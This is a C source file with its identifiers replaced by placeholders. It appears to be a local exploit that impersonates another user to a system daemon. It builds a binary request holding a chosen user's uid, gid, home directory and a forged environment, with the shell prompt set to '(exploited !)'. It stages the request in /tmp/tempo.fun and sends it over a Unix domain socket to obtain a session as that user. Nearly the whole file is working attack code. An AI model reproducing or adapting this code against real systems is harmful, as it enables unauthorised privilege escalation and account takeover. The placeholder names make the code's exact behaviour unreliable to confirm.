
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_un {char* sun_path; int sun_family; } ;
struct sockaddr {int dummy; } ;
struct passwd {char* pw_dir; char* pw_name; int pw_uid; int pw_gid; } ;
struct hostent {int dummy; } ;
typedef int FILE ;


 int VAR_0 ;
 char* VAR_1 ;
 char* VAR_2 ;
 char* VAR_3 ;
 char* VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 char* VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 char* VAR_10 ;
 int FUNC_0 (char*,int) ;
 int FUNC_1 (int) ;
 scalar_t__ FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int *) ;
 int * FUNC_5 (char*,char*) ;
 int FUNC_6 (char*,int,int,int *) ;
 int FUNC_7 (int *,int ,int ) ;
 int FUNC_8 (int *) ;
 int FUNC_9 (char*,int,int,int *) ;
 char* FUNC_10 (char*) ;
 struct passwd* FUNC_11 (char*) ;
 int FUNC_12 (char*) ;
 int FUNC_13 (char*,char*,...) ;
 int FUNC_14 (char*,int *) ;
 int FUNC_15 (int ,int ,int ) ;
 int FUNC_16 (char*,char*,...) ;
 int FUNC_17 (char*,char*) ;
 int FUNC_18 (char*) ;
 int FUNC_19 (int,char*,int) ;

FUNC_20(int VAR_11,char** VAR_12)
{ struct sockaddr_un VAR_13,VAR_14;
  struct hostent *VAR_15;
  struct passwd *VAR_16;
  int VAR_17,VAR_18,VAR_19,VAR_20,VAR_21;
  char VAR_22[VAR_9],VAR_23[VAR_9],*VAR_24,*VAR_25;
  FILE *VAR_26;

  char *VAR_27,*VAR_28;
  int VAR_29,VAR_30;

  FUNC_13("\n\n%s\n\n",VAR_1);

  if (VAR_11!=2) { FUNC_13("%s\n",VAR_2);
                 FUNC_3(1); }


  VAR_16=FUNC_11(VAR_12[1]);
  if (!VAR_16) { FUNC_13("%s\n",VAR_10);
                 FUNC_3(1); }

  VAR_27=VAR_16->pw_dir;
  VAR_28=VAR_16->pw_name;
  VAR_29=VAR_16->pw_uid;
  VAR_30=VAR_16->pw_gid;

  VAR_26=FUNC_5("/tmp/tempo.fun","wb");

  VAR_17=FUNC_15(VAR_0,VAR_8,0);
  VAR_13.sun_family=VAR_0;
  FUNC_17(VAR_13.sun_path,VAR_7);
  VAR_20=sizeof(struct sockaddr_un);


  if (FUNC_2(VAR_17,(struct sockaddr*)&VAR_13,VAR_20)<0)
     { FUNC_12("connect");
       FUNC_3(1); }




  FUNC_16(VAR_22,"%c%c%c%c%c%c",0,0,VAR_29>>8,VAR_29-((VAR_29>>8)*256),0,0);
  FUNC_9(VAR_22,1,6,VAR_26);


  FUNC_16(VAR_22,"%c%c",VAR_30>>8,VAR_30-((VAR_30>>8)*256));
  FUNC_9(VAR_22,1,2,VAR_26);



  FUNC_0(VAR_22,VAR_9);
  FUNC_17(VAR_22,FUNC_10("DISPLAY"));
  FUNC_9(VAR_22,1,259,VAR_26);



  FUNC_16(VAR_22,"%c%c%c%c%c%c%c%c%c",1,67,0,0,0,0,0,0,0);
  FUNC_9(VAR_22,1,9,VAR_26);



  FUNC_14(VAR_27,VAR_26);



  FUNC_14(VAR_28,VAR_26);



  FUNC_14(VAR_28,VAR_26);



  FUNC_14(VAR_4,VAR_26);
  FUNC_16(VAR_22,"%c%c%c%c",23,0,0,0);
  FUNC_9(VAR_22,1,4,VAR_26);

  FUNC_16(VAR_22,"_=./startinfo");
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"TMPDIR=/tmp");
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"LANG=%s",FUNC_10("LANG"));
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"LOGIN=%s",VAR_28);
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"NLSPATH=%s",FUNC_10("NLSPATH"));
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"PATH=%s",FUNC_10("PATH"));
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"%s","EDITOR=emacs");
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"LOGNAME=%s",VAR_28);
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"MAIL=/usr/spool/mail/%s",VAR_28);
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"HOSTNAME=%s",FUNC_10("HOSTNAME"));
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"LOCPATH=%s",FUNC_10("LOCPATH"));
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"%s","PS1=(exploited !) ");
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"USER=%s",VAR_28);
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"AUTHSTATE=%s",FUNC_10("AUTHSTATE"));
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"DISPLAY=%s",FUNC_10("DISPLAY"));
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"SHELL=%s",FUNC_10("SHELL"));
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"%s","ODMDIR=/etc/objrepos");
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"HOME=%s",VAR_27);
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"%s","TERM=vt220");
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"%s","MAILMSG=[YOU HAVE NEW MAIL]");
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"PWD=%s",VAR_4);
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"%s","TZ=NFT-1");
  FUNC_14(VAR_22,VAR_26);

  FUNC_16(VAR_22,"%s","A__z=! LOGNAME");
  FUNC_14(VAR_22,VAR_26);




  FUNC_16(VAR_22,"%c%c%c%c",1,45,113,0);
  FUNC_9(VAR_22,1,4,VAR_26);

  FUNC_4(VAR_26);

  VAR_26=FUNC_5("/tmp/tempo.fun","rb");
  FUNC_7(VAR_26,0,VAR_5);
  VAR_21=FUNC_8(VAR_26);
  FUNC_7(VAR_26,0,VAR_6);
  FUNC_6(VAR_23,1,VAR_21,VAR_26);
  FUNC_4(VAR_26);

  FUNC_18("/tmp/tempo.fun");



  FUNC_19(VAR_17,VAR_23,VAR_21);

  FUNC_13("\n%s %s\n",VAR_3,FUNC_10("HOSTNAME"));

  FUNC_1(VAR_17);
}
